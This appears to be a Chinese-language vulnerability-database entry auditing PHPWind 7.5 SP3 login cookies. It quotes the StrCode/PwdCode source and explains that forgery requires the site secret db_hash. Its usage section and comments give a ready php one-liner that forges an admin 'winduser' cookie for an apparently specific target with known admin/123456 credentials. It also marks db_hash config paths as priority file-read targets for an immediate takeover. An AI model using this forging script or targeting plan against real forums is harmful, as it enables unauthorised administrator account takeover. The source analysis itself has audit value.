# PHPWind 7.5 SP3 cookie 登录态：StrCode 无 MAC 可逆，但伪造受 db_hash 封死（拿到 db_hash 即账号接管）

- **code**: phpwind-7.5-sp3-cookie-登录态-strcode-无-mac-可逆-但伪造受-db_hash-封死-拿到-db_hash-即账号接管
- **kind**: script
- **category**: auth-bypass
- **component**: PHPWind 7.5 SP3 cookie 登录态（StrCode / PwdCode / User_info）
- **severity**: medium
- **language**: php
- **source**: self
- **source_url**: https://blog.csdn.net/hzcyclone/article/details/7344394
- **verified_note**: 7.5 SP3 源码逐行确证（common.php:242-266、global.php:126/182/616-681、common.php:206-208）。公开资料对 PwdCode/StrCode 的表述与源码逐字符一致，交叉印证。7.3.2 的算法对照未做，但该函数属 PHPWind 长期稳定代码（公开文章从 7.x 时代即如此描述）。
- **path**: pocs/phpwind-7.5-sp3-cookie-登录态-strcode-无-mac-可逆-但伪造受-db_hash-封死-拿到-db_hash-即账号接管/poc.php
- **tags**: phpwind,cookie,StrCode,PwdCode,User_info,db_hash,登录态,账号接管
- **created_at**: 2026-10-06T11:59:59.296Z

## 描述

PHPWind 7.5 SP3 登录态 cookie 机制审计。StrCode 为逐字节异或 + base64，密钥 = substr(md5(HTTP_USER_AGENT . db_hash), 8, 18)，无 MAC、无完整性校验、完全可逆；PwdCode = md5(HTTP_USER_AGENT . password . db_hash)。但 User_info()（global.php:626-681）的校验是双重的：先用 uid 查库（getUserByUid 的 SQL 不含 password 条件），再要求 PwdCode($detail['password']) 等于 cookie 里的 windpwd，另有 $db_ipcheck 与 $db_ifsafecv 两道附加校验，任一不匹配即 Loginout() 回落 guest。因此伪造 cookie 必须同时掌握目标用户的 password(md5) 与站点唯一密钥 db_hash —— 只在拿到 db_hash 后才可行。cookie 前缀 substr(md5(db_sitehash),0,5) 无法反推 db_hash。结论：单靠 cookie 伪造不能提权；但任何任意文件读漏洞（读到 data/bbscache/config.php 的 db_hash）都会立刻升级为账号接管，配合已掌握的 admin/123456 可直接构造 admin 的 winduser cookie 绕过登录页与风控。

## 用法

```
无需发包即可判定的部分已判死。给出两条可行动作：
1) 把"读到 data/bbscache/config.php（db_hash）"列为最高价值的任意文件读目标 —— 一旦有 LFI/目录穿越/备份泄露，
   立刻用下列脚本伪造 admin cookie（已知 admin/123456）：
     php -r '$ua="Mozilla/5.0 ..."; $db_hash="<从 config.php 读出>"; $p=md5("123456");
             $windpwd=md5($ua.$p.$db_hash);
             $key=substr(md5($ua.$db_hash),8,18);
             $s="1\t$windpwd\t"; $c=""; for($i=0;$i<strlen($s);$i++){$c.=$s[$i]^$key[$i%strlen($key)];}
             echo "752fb_winduser=".base64_encode($c)."\n";'
     （注意 PwdCode 的入参语义：User_info 里传的是 DB 的 password 字段即 md5 值）
     UA 必须与后续请求的 User-Agent 完全一致，否则密钥与 PwdCode 双双失配。
2) 检查目标是否开放了备份/临时文件读取：GET /bbs/data/sql_config.php、/bbs/data/bbscache/config.php
   —— 直接访问这两个 .php 只会执行（输出空白），不会泄露源码；此处仅作路径认知，不要据此判断已泄露。
3) 不要尝试爆破 db_hash：cookie 前缀 752fb_ 是 md5(db_sitehash) 前 5 位，与 db_hash 无函数关系。
```

## 正文

```
// ============================================================================
// 结论：登录态 cookie 加密【可逆、无 MAC】，但伪造需要站点唯一密钥 db_hash
//       → 单靠 cookie 伪造无法接管账号；但 db_hash 一旦泄露即等于账号接管。
// ============================================================================
//
// 【一】算法原文（require/common.php）
242: function PwdCode($pwd){
243: 	return md5($GLOBALS['pwServer']['HTTP_USER_AGENT'].$pwd.$GLOBALS['db_hash']);
244: }
256: function StrCode($string,$action='ENCODE'){
257: 	$action != 'ENCODE' && $string = base64_decode($string);
258: 	$code = '';
259: 	$key  = substr(md5($GLOBALS['pwServer']['HTTP_USER_AGENT'].$GLOBALS['db_hash']),8,18);
260: 	$keylen = strlen($key); $strlen = strlen($string);
261: 	for ($i=0;$i<$strlen;$i++) {
262: 		$k		= $i % $keylen;
263: 		$code  .= $string[$i] ^ $key[$k];
264: 	}
265: 	return ($action!='DECODE' ? base64_encode($code) : $code);
266: }
// · 加密 = 逐字节异或 + base64；密钥 = substr(md5(UA . db_hash), 8, 18)（18 字符）
// · 【无 MAC、无完整性校验、完全可逆】；UA 由攻击者自选，所以唯一未知量是 db_hash
// · 公开资料印证（https://blog.csdn.net/hzcyclone/article/details/7344394）：PwdCode / StrCode 原文与本源码逐字符一致
//
// 【二】cookie 结构与校验
// global.php:126  list($winduid,$windpwd,$safecv) = explode("\t",addslashes(StrCode(GetCookie('winduser'),'DECODE')));
// global.php:182  if (is_numeric($winduid) && strlen($windpwd)>=16) { $winddb = User_info(); ... }
// global.php:626-681 User_info()：
629: 	$detail = getUserByUid($winduid);            // 仅按 uid 查库（getUserByUid 的 SQL 里没有 password 条件）
638: 	if (!$detail || PwdCode($detail['password']) != $windpwd || ($db_ifsafecv && $safecv != $detail['safecv']) || $loginout || $detail['yz'] > 1) {
639: 		$GLOBALS['groupid'] = 'guest';
641: 		Loginout();
646: 		Showmsg('ip_change');
647: 	} else { ... 正常登录 ... }
// ★ 校验是【双重】的：uid 找到记录后，还必须 PwdCode($detail['password']) == $windpwd
//   而 PwdCode 里含 db_hash → 想伪造必须同时掌握【目标用户的 password(md5)】与【db_hash】
// · 另有 $db_ipcheck（IP 段校验，global.php:634-637）与 $db_ifsafecv（安全问答 $safecv）两道附加校验，
//   任一不匹配即 Loginout() 并回落到 guest
// · cookie 前缀 = substr(md5($db_sitehash),0,5)（require/common.php:206-208）→ 目标实测前缀 752fb_
//   ★ 该前缀只泄露 db_sitehash 的 md5 前 5 位，无法反推 db_hash（两个不同的值）
//
// 【三】可达性判定
// · 已知 admin/123456 → md5('123456') = e10adc3949ba59abbe56e057f20f883e 可自行算出
//   → 若拿到 db_hash，即可构造：
//     $windpwd = md5(UA . 'e10adc3949ba59abbe56e057f20f883e' . $db_hash)
//     注：PwdCode 的入参 $detail['password'] 是数据库里的 md5 值，不是明文（对照 passport_client.php:82
//     处传的 $userdb['password'] 是外部传入的字符串，两者对应同一个字段语义）
//     $winduser = StrCode("1\t$windpwd\t")   // uid=1 即 admin
//     Cookie: 752fb_winduser=<该值>
// · 【缺 db_hash → 不可行】。db_hash 位于 data/bbscache/config.php（global.php:24 require 该文件）
//
// 【四】由此得出的战略价值（重要）
// ★ 任何"任意文件读"漏洞（哪怕只读 data/bbscache/config.php）在本站的价值被显著放大：
//   拿到 db_hash 后，配合已知的 admin/123456，可直接伪造 admin 登录 cookie（不需要走登录页、绕过验证码/风控），
//   也可以伪造任意"版主 uid"若同时知道其 password 的 md5（可从 pw_members 读）。
// ★ 反之，仅靠 StrCode 可逆性无法伪造：db_hash 不可猜、cookie 前缀不是 db_hash 的函数。
//
// 【五】其它 cookie 的权限影响（均不能单独提权）
// · lastvisit / lastpos / ol_offset / skinco / columns / c_stamp / userads / hideid：
//   仅影响在线时长统计、跳转、皮肤、布局，不参与 groupid / 权限判定
// · AdminUser（后台）：require/common.php:245-255 SafeCheck() —— 结构 [timestamp, admin_name, md5(PwdCode(PwdCode(admin_pwd)).timestamp), safecv]，
//   有效期 1800 秒，且 PwdCode 含 UA 与 db_hash → 同样需要 db_hash，且额外与 User-Agent 强绑定（换 UA 立即失效）
// · 不存在"单独一个 cookie 就能改 groupid / 权限位"的路径（groupid 全部来自 pw_members 查询结果，global.php:193）
```
